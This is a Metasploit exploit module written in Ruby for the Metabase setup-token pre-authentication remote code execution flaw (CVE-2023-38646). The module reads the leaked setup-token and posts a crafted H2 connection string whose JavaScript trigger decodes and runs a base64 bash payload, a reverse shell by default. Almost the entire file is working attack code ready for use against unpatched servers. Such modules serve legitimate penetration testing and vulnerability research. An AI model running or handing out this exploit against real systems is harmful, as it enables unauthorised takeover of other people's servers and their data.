##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Metabase Setup Token RCE',
        'Description' => %q{
          Metabase versions before 0.46.6.1 contain a flaw where the secret setup-token
          is accessible even after the setup process has been completed. With this token
          a user is able to submit the setup functionality to create a new database.
          When creating a new database, an H2 database string is created with a TRIGGER
          that allows for code execution. We use a sample database for our connection
          string to prevent corrupting real databases.

          Successfully tested against Metabase 0.46.6.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Maxwell Garrett', # original PoC, analysis
          'Shubham Shah' # original PoC, analysis
        ],
        'References' => [
          ['URL', 'https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/'],
          ['URL', 'https://www.metabase.com/blog/security-advisory'],
          ['CVE', '2023-38646']
        ],
        'Platform' => ['unix'],
        'Privileged' => false,
        'Arch' => ARCH_CMD,
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/unix/reverse_bash'
          # for docker payload/cmd/unix/reverse_netcat also works, but no perl/python
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-07-22',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [ true, 'The URI of the Metabase Application', '/'])
      ]
    )
  end

  def get_bootstrap_json_blob_from_html_resp(html)
    %r{<script type="application/json" id="_metabaseBootstrap">([^>]+)</script>} =~ html
    begin
      JSON.parse(Regexp.last_match(1))
    rescue JSON::ParserError, TypeError
      print_bad('Unable to parse JSON blob')
      nil
    end
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    )

    return CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return CheckCode::Unknown("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    json = get_bootstrap_json_blob_from_html_resp(res.body)
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response, unable to load JSON blob") if json.nil?
    version = json.dig('version', 'tag')
    return CheckCode::Unknown("#{peer} - Unable to determine version from JSON blob") if version.nil?

    # typically v0.46.6
    version = version.gsub('v', '')

    if Rex::Version.new(version) < Rex::Version.new('0.46.6.1')
      return CheckCode::Appears("Version Detected: #{version}")
    end

    CheckCode::Safe("Version not vulnerable: #{version}")
  end

  def exploit
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200
    json = get_bootstrap_json_blob_from_html_resp(res.body)
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response, unable to load JSON blob") if json.nil?
    setup_token = json['setup-token']
    if setup_token.nil?
      print_status('Setup token is nil, checking secondary location')
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'api', 'session', 'properties'),
        'method' => 'GET'
      )
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200
      json = res.get_json_document
      setup_token = json['setup-token']
    end

    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to find valid setup-token") if setup_token.nil?
    print_good("Found setup token: #{setup_token}")

    print_status('Sending exploit (may take a few seconds)')
    # our base64ed payload can't have = in it, so we'll pad out with spaces to remove them
    b64_pe = ::Base64.strict_encode64(payload.encoded)
    equals_count = b64_pe.count('=')
    if equals_count > 0
      b64_pe = ::Base64.strict_encode64(payload.encoded + ' ' * equals_count)
    end

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'setup', 'validate'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => {
        'token' => setup_token,
        'details' =>
          {
            # 'is_on_demand' => false, # without this, the shell takes ~20 sec longer to get
            # 'is_full_sync' => false,
            # 'is_sample' => false,
            # 'cache_ttl' => nil,
            # 'refingerprint' => false,
            # 'auto_run_queries' => true,
            # 'schedules' => {},
            'details' =>
              {
                'db' => "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER #{Rex::Text.rand_text_alpha_upper(6..12)} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\n$$--=x",
                'advanced-options' => false,
                'ssl' => true
              },
            'name' => Rex::Text.rand_text_alphanumeric(6..12),
            'engine' => 'h2'
          }
      }.to_json
    )
  end
end
